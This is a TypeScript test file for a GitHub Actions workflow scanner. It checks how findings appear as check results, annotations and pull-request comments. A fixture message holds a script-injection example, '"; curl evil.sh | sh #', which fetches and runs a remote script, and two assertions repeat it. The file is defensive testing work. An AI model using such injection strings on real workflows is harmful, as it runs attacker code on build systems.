import { describe, expect, it } from "vitest";
import {
  ALL_CLEAR,
  COMMENT_MARKER,
  checkOutput,
  commentBody,
  conclusion,
  type FileResult,
} from "../src/report.js";
import type { Finding, Severity } from "../src/rules.js";

const f = (severity: Severity, line = 3, rule: Finding["rule"] = "script-injection"): Finding => ({
  rule,
  severity,
  line,
  job: "build",
  message: 'A title like `"; curl evil.sh | sh #` becomes code.',
  key: `${rule}|${severity}|${line}`,
});
const file = (findings: Finding[], error?: string): FileResult => ({
  path: ".github/workflows/ci.yml",
  findings,
  error,
});

describe("conclusion", () => {
  it("fails when a finding reaches fail_on", () => {
    expect(conclusion([file([f("high")])], "high")).toBe("failure");
    expect(conclusion([file([f("critical")])], "high")).toBe("failure");
  });

  it("is neutral for findings below fail_on, and for files it couldn't read", () => {
    expect(conclusion([file([f("medium")])], "high")).toBe("neutral");
    expect(conclusion([file([], "Invalid YAML")], "high")).toBe("neutral");
  });

  it("never fails with fail_on: never", () => {
    expect(conclusion([file([f("critical")])], "never")).toBe("neutral");
  });

  it("succeeds without findings", () => {
    expect(conclusion([file([])], "low")).toBe("success");
    expect(conclusion([], "low")).toBe("success");
  });
});

describe("checkOutput", () => {
  it("counts by severity in the title", () => {
    const out = checkOutput([file([f("critical"), f("medium"), f("medium", 9)])], []);
    expect(out.title).toBe("3 new risks: 1 critical, 2 medium");
  });

  it("says so when nothing new was found", () => {
    expect(checkOutput([file([])], []).title).toBe("No new risks in 1 workflow file");
    expect(checkOutput([file([]), file([])], []).title).toBe("No new risks in 2 workflow files");
  });

  it("annotates each finding on its line with a level GitHub knows", () => {
    const out = checkOutput([file([f("critical", 4), f("medium", 5), f("low", 6)])], []);
    expect(out.annotations).toEqual([
      expect.objectContaining({
        path: ".github/workflows/ci.yml",
        start_line: 4,
        end_line: 4,
        annotation_level: "failure",
      }),
      expect.objectContaining({ start_line: 5, annotation_level: "warning" }),
      expect.objectContaining({ start_line: 6, annotation_level: "notice" }),
    ]);
    expect(out.annotations[0]!.title).toBe("script-injection (critical)");
    expect(out.annotations[0]!.message).toContain("evil.sh");
  });

  it("puts findings, unreadable files and config warnings in the summary", () => {
    const out = checkOutput(
      [file([f("high")]), { path: ".github/workflows/broken.yml", findings: [], error: "Invalid YAML: x" }],
      ['Unknown setting "colour".'],
    );
    expect(out.summary).toContain("| high | `.github/workflows/ci.yml:3` |");
    expect(out.summary).toContain("curl evil.sh \\| sh"); // pipes escaped inside the table
    expect(out.summary).toContain("`.github/workflows/broken.yml`: Invalid YAML: x");
    expect(out.summary).toContain('Unknown setting "colour".');
    expect(out.summary).toContain("https://maximilianfeix.github.io/actions-guard/#script-injection");
  });
});

describe("commentBody", () => {
  it("starts with the marker so the comment can be found and updated", () => {
    const body = commentBody([file([f("high")])], []);
    expect(body.startsWith(COMMENT_MARKER)).toBe(true);
    expect(body).toContain("1 new risk: 1 high");
    expect(body).toContain("Only risks this pull request adds are listed");
  });

  it("has an all-clear version for when the risks are gone", () => {
    expect(ALL_CLEAR.startsWith(COMMENT_MARKER)).toBe(true);
    expect(ALL_CLEAR).toContain("No new risks");
  });
});
